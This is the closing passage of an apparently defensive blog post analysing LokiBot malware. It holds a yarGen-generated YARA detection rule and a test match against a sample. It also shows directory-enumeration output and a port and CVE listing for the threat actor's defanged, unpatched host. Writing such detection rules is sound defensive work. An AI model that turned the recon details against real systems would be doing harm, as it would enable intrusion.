</span></span><span class=line><span class=cl>      <span class=nv>hash2</span> <span class=o>=</span> <span class=s2>&#34;d82d9f74c7d1b768a2c170b47117222fdf81a2aaae69ac2c61e893e94524c424&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nv>hash3</span> <span class=o>=</span> <span class=s2>&#34;8fd93f5dc3041c50e1a6910aae03f95a22e632952ec987447859bec00bd31fa2&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nv>hash4</span> <span class=o>=</span> <span class=s2>&#34;3074b2ea06a803ab002e0bee1adc9b08dd62731563e3026b5db226367b7a44ab&#34;</span>
</span></span><span class=line><span class=cl>   strings:
</span></span><span class=line><span class=cl>      <span class=nv>$s1</span> <span class=o>=</span> <span class=s2>&#34;lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R&#34;</span> ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s2</span> <span class=o>=</span> <span class=s2>&#34;UE 3J:\&#34;&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s3</span> <span class=o>=</span> <span class=s2>&#34;16.0.0.0&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s4</span> <span class=o>=</span> <span class=s2>&#34;c%s8u -Ld&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s5</span> <span class=o>=</span> <span class=s2>&#34;w -|/</span>$<span class=s2>)&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s6</span> <span class=o>=</span> <span class=s2>&#34;TripleDESCryptoServiceProvider&#34;</span> fullword ascii /* Goodware String - occured <span class=m>36</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>      <span class=nv>$s7</span> <span class=o>=</span> <span class=s2>&#34;MD5CryptoServiceProvider&#34;</span> fullword ascii /* Goodware String - occured <span class=m>50</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>      <span class=nv>$s8</span> <span class=o>=</span> <span class=s2>&#34;CipherMode&#34;</span> fullword ascii /* Goodware String - occured <span class=m>54</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>      <span class=nv>$s9</span> <span class=o>=</span> <span class=s2>&#34;CreateDecryptor&#34;</span> fullword ascii /* Goodware String - occured <span class=m>76</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>      <span class=nv>$s10</span> <span class=o>=</span> <span class=s2>&#34;ComputeHash&#34;</span> fullword ascii /* Goodware String - occured <span class=m>226</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>      <span class=nv>$s11</span> <span class=o>=</span> <span class=s2>&#34;System.Security.Cryptography&#34;</span> fullword ascii /* Goodware String - occured <span class=m>305</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>      <span class=nv>$s12</span> <span class=o>=</span> <span class=s2>&#34;&lt;Sshu%xf&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s13</span> <span class=o>=</span> <span class=s2>&#34;untimeResourceSet&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s14</span> <span class=o>=</span> <span class=s2>&#34;vfRfy&lt;M&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s15</span> <span class=o>=</span> <span class=s2>&#34;SkTZk@a8&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s16</span> <span class=o>=</span> <span class=s2>&#34;IVow\\B&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s17</span> <span class=o>=</span> <span class=s2>&#34;_PFgN&gt;NJ&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s18</span> <span class=o>=</span> <span class=s2>&#34;/u.low&#34;</span> fullword ascii
</span></span><span class=line><span class=cl>      <span class=nv>$s19</span> <span class=o>=</span> <span class=s2>&#34;System.Runtime.CompilerServices&#34;</span> fullword ascii /* Goodware String - occured <span class=m>1950</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>      <span class=nv>$s20</span> <span class=o>=</span> <span class=s2>&#34;b77a5c561934e089&#34;</span> ascii /* Goodware String - occured <span class=m>2</span> <span class=nb>times</span> */
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nv>$op0</span> <span class=o>=</span> <span class=o>{</span> ff <span class=m>25</span> <span class=m>00</span> <span class=m>20</span> <span class=m>40</span> <span class=m>00</span> <span class=m>48</span> <span class=m>34</span> <span class=m>46</span> 5a <span class=m>54</span> <span class=m>47</span> <span class=m>43</span> <span class=m>58</span> <span class=m>38</span> <span class=m>37</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>      <span class=nv>$op1</span> <span class=o>=</span> <span class=o>{</span> <span class=m>08</span> <span class=m>00</span> <span class=m>00</span> <span class=m>11</span> <span class=m>00</span> <span class=m>03</span> 2c 0b <span class=m>02</span> 7b <span class=m>34</span> <span class=m>00</span> <span class=m>00</span> <span class=m>04</span> <span class=m>14</span> fe <span class=o>}</span>
</span></span><span class=line><span class=cl>      <span class=nv>$op2</span> <span class=o>=</span> <span class=o>{</span> <span class=m>81</span> <span class=m>00</span> cb <span class=m>23</span> <span class=m>06</span> <span class=m>00</span> <span class=m>34</span> <span class=m>00</span> <span class=m>98</span> <span class=m>89</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>   condition:
</span></span><span class=line><span class=cl>      <span class=o>(</span> uint16<span class=o>(</span>0<span class=o>)</span> <span class=o>==</span> 0x5a4d and filesize &lt; 2000KB and <span class=o>(</span> <span class=m>8</span> of them <span class=o>)</span> and all of <span class=o>(</span><span class=nv>$op</span>*<span class=o>)</span>
</span></span><span class=line><span class=cl>      <span class=o>)</span> or <span class=o>(</span> all of them <span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>Let&rsquo;s quickly testing out if the rules work, I have a docker-based version of yara installed, so I can run the rules against a sample file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ yara /malware/yarGen/test_sample.yar -r /malware/raw_files
</span></span><span class=line><span class=cl>_vbc_vbc_22_vbc_57_vbc_58_0 /malware/raw_files/vbc_58.exe
</span></span></code></pre></div><p>As you can see it did indeed match with the given sample, pretty neat, I also tested with the other automated rules and it worked better than expected. If anyone is keen, drop me a message on Twitter and I will showcase how to build this into your automated static analysis process.</p><h2 id=step-6-bloopers>Step 6. Bloopers<a href=#step-6-bloopers class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>I&rsquo;m still in awe how bad the infrastructure is of the Threat Actor, running outdated, unpatched, unhardened applications. But I&rsquo;m assuming it was all due to a quick and dirty win, regardless of what the outcomes were, they can just spin up more&mldr; Change their A records and continue moving.</p><p>Anyway, just take a look at this snippet of their web directory structure, I didn&rsquo;t include most of it because it&rsquo;s besides the point, but as you can see the IoC&rsquo;s we&rsquo;re after was just waiting there, no attempt to even host it on a another server, this whole campeign was done on a single host.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ docker_dirb -u hxxp://192<span class=o>[</span>.<span class=o>]</span>3<span class=o>[</span>.<span class=o>]</span>122<span class=o>[</span>.<span class=o>]</span><span class=m>162</span>                                 <span class=m>1</span> ↵
</span></span><span class=line><span class=cl>&lt;snip&gt;
</span></span><span class=line><span class=cl>File found: /21/vbc.exe - <span class=m>200</span>
</span></span><span class=line><span class=cl>File found: /22/vbc.exe - <span class=m>200</span>
</span></span><span class=line><span class=cl>File found: /57/vbc.exe - <span class=m>200</span>
</span></span><span class=line><span class=cl>File found: /58/vbc.exe - <span class=m>200</span>
</span></span><span class=line><span class=cl>Dir found: /dashboard/ - <span class=m>200</span>
</span></span><span class=line><span class=cl>File found: /dashboard/phpinfo.php - <span class=m>200</span>
</span></span><span class=line><span class=cl>Dir found: /phpmyadmin/ - <span class=m>403</span>
</span></span><span class=line><span class=cl>Dir found: /webalizer/ - <span class=m>403</span>
</span></span><span class=line><span class=cl>Dir found: /ships/ - <span class=m>200</span>
</span></span><span class=line><span class=cl>File found: /ships/shp_57.doc - <span class=m>200</span>
</span></span><span class=line><span class=cl>File found: /ships/shp_58.doc - <span class=m>200</span>
</span></span><span class=line><span class=cl>Dir found: /xampp/ - <span class=m>200</span>
</span></span><span class=line><span class=cl>&lt;/snip&gt;
</span></span></code></pre></div><p>Here are some more unhardened things that was open from the outside :</p><pre tabindex=0><code>Number of open ports:    7
Vulnerabilities:         CVE-2022-2097	CVE-2022-1292	CVE-2022-26377	CVE-2022-30522	CVE-2022-28614	CVE-2022-2068	CVE-2022-29404	CVE-2022-31813	CVE-2022-28615	CVE-2022-30556	CVE-2022-28330

Ports:
     80/tcp Apache httpd (2.4.53)
    135/tcp Microsoft RPC Endpoint Mapper
    139/tcp
    443/tcp Apache httpd (2.4.53)
	|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2, TLSv1.3
	|-- Diffie-Hellman Parameters:
		Bits:          1024
		Generator:     2
		Fingerprint:   RFC2409/Oakley Group 2
    445/tcp
	|-- SMB Status:
		Authentication: enabled
		SMB Version: 1
		OS: Windows Server 2016 Standard 14393
		Software: Windows Server 2016 Standard 6.3
		Capabilities: extended-security, infolevel-passthru, large-files, large-readx, large-writex, level2-oplocks, lock-and-read, lwio, nt-find, nt-smb, nt-status, rpc-remote-api, unicode
   3306/tcp
   3389/tcp Remote Desktop Protocol
	|-- SSL Versions: -SSLv2, -SSLv3, TLSv1, TLSv1.1, TLSv1.2
	|-- Diffie-Hellman Parameters:
		Bits:          2048
		Generator:     00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002
</code></pre></div><hr class=post-end><footer class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://ivanvza.github.io/tags/lokibot>LokiBot</a></span><span class=tag><a href=https://ivanvza.github.io/tags/malware>Malware</a></span><span class=tag><a href=https://ivanvza.github.io/tags/credential-harvester>Credential Harvester</a></span><span class=tag><a href=https://ivanvza.github.io/tags/analysis>Analysis</a></span><span class=tag><a href=https://ivanvza.github.io/tags/reverse-engineering>Reverse Engineering</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>3515 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-08-05 20:17</p></footer></article><div class="post-nav thin"></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2022 <a href=https://ivanvza.github.io>Ivan</a> &#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></p><p>Made with &lt;3 &#183; <a href=https://ivanvza.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></p></footer><script src=https://ivanvza.github.io/js/bundle.min.580988ed2982bcbb74a1773c7abea97b43e4c43b9324e10cda0813ec6ec4bb67.js integrity="sha256-WAmI7SmCvLt0oXc8er6pe0PkxDuTJOEM2ggT7G7Eu2c=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-N2E8LVQ3C6"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-N2E8LVQ3C6")</script></body></html>